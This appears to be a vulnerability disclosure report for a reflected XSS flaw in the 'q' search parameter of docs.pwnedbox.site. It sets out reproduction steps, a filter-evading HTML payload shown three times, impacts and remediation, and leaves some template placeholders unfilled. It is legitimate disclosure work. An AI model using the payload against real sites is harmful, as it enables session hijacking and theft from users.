## Title

Reflected XSS Hidden Parameter


## Description

**Affected URL:** https://docs.pwnedbox.site

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

**Parameter:** https://docs.pwnedbox.site/?q=

**Severity:** [High]

**Description:**

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the application. User-supplied input is reflected in the HTTP response without proper sanitization or output encoding, allowing JavaScript execution in the victim's browser.

## Steps to Reproduce

1. Visit the affected URL :- https://tutorialrepublic.pwnedbox.site/ .
2. Navigate to the vulnerable functionality.
3. Insert the following XSS payload into the vulnerable parameter:

   ```html
   </h1>'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
   ```

4. Submit the input.
5. Observe that JavaScript executes in the browser.

## Proof of Concept (POC)

### Screenshot


<img width="1917" height="455" alt="Screenshot 2026-11-16 091048" src="https://github.com/user-attachments/assets/f8863a84-73e6-4e22-9525-3f41227ec776" />
<img width="1917" height="440" alt="Screenshot 2026-11-16 091042" src="https://github.com/user-attachments/assets/60a48ce6-41ac-473c-a483-f99a14c7924f" />


### Video Demonstration


**Video Link:** [https://drive.google.com/file/d/1VKAtXZHyFgnXvHRbH-7S8Cm02bn-FxU4/view?usp=sharing]

### HTTP Request / Response


```http
https://docs.pwnedbox.site/?q=%3C/h1%3E%27%221%3C!--%3E%3C/Title/%3C/Textarea/%3C/Script/%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)--%3E
```

### Payload

```html
   </h1>'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
```


## Impact

Depending on the application's functionality, this vulnerability could lead to:

- **Account Takeover:** Stealing session cookies through `document.cookie` when cookies are not protected by `HttpOnly`, potentially allowing attackers to hijack user accounts.
- **Sensitive Data Theft:** Accessing personal information, API responses, and other sensitive data available to the victim's browser.
- **Unauthorized Actions:** Performing actions on behalf of authenticated users, such as changing account settings or modifying user information.
- **Admin Account Compromise:** Potentially targeting administrators to gain access to privileged application functionality.
- **Credential Theft:** Injecting fake login forms to capture users' login credentials.
- **Internal Network Access:** Using the victim's browser to interact with internal services accessible from their network.
- **Phishing & Redirection:** Redirecting users to malicious websites or displaying fake content.
- **Application Manipulation:** Modifying website content or manipulating application functionality.

**Actual Impact:** [Describe the impact demonstrated during testing.]

**Affected Users:** [All Users / Authenticated Users / Administrators]

### References

These are useful technical references for understanding and documenting XSS impact:

1. [PortSwigger – Cross-Site Scripting and Impact](https://portswigger.net/web-security/cross-site-scripting)
2. [PortSwigger – Exploiting XSS Vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)
3. [OWASP – Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
4. [OWASP – XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
5. [Microsoft – Weaponizing Cross-Site Scripting](https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough)


## Remediation

- Properly encode user-controlled output based on its HTML context.
- Sanitize untrusted input where appropriate.
- Avoid unsafe DOM manipulation methods such as `innerHTML`.
- Implement a restrictive Content Security Policy (CSP) as an additional security layer.

## References

- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/cross-site-scripting
